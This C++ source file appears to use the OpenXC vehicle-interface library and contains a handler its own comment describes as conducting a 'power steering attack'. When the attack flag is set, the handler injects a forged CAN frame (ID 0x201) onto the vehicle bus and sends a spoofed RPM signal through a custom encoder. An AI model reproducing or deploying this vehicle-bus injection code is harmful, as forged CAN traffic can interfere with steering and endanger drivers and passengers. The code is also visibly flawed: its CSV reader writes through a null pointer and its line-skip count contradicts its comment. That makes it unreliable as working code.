//Contains handlers for translations in commmand library.

namespace can = openxc::can; 
using openxc::can::lookupSignal;

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <stdlib.h>

const int ROWS = 100; // CAN messages
const int COLS = 22; // Colums per message
const int BUFFSIZE = 80;

int **readCSV() {
	
	int **array = 0;
	std::ifstream file( "power_steering.csv" );
	std::string line; 
	int col = 0;
	int row = 0;
	
    if (!file.is_open())
    {
        return 0;
    }

	for (int i = 1; i < 98; i++){
    	std::getline(file, line); // skip the first 98 lines
	}

	while( std::getline( file, line ) ) {
	
		std::istringstream iss( line );
		std::string result;
	
		while( std::getline( iss, result, ',' ) ) {

		    array[row][col] = atoi( result.c_str() );
		    col = col+1;
	  	}
		row = row+1;
		col = 0;
	}
	return array;
}


//Handler to conduct power steering attack
void powerSteeringHandler(const char* name, openxc_DynamicField* value,
	openxc_DynamicField* event, CanSignal* signals, int signalCount) {

	CanMessage can_message = {0};
	CanBus* bus = openxc::can::lookupBus(1, openxc::signals::getCanBuses(), openxc::signals::getCanBusCount());
	const bool attack = value->boolean_value;

	uint64_t can_value = {0};
	CanSignal* rpmSignal = lookupSignal("set_rpm", signals,
		signalCount);

	int **array;
	if (attack == true) {

		array = readCSV();
		can_value = 0x4E;
		can_message = {0x201, STANDARD, {0x2B, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 8};
	
		can::write::enqueueMessage(bus, &can_message);
		can::write::flushOutgoingCanMessageQueue(bus);
		can::write::sendEncodedSignal(rpmSignal, can_value, true);
	}
}

//Encodes decimal RPM value
uint64_t ourRPMWriteEncoder(CanSignal* signal, openxc_DynamicField* value, bool* send) {
		
	*send = true;
	
	uint64_t can_value = value->numeric_value;

	can_value = can_value / 64;
	can_value <<= 56; //shift to CAN bytes 0 and 1
	can_value = can_value | 0x0000000028000000; // OR with 0x00000028

	return can_value;
}
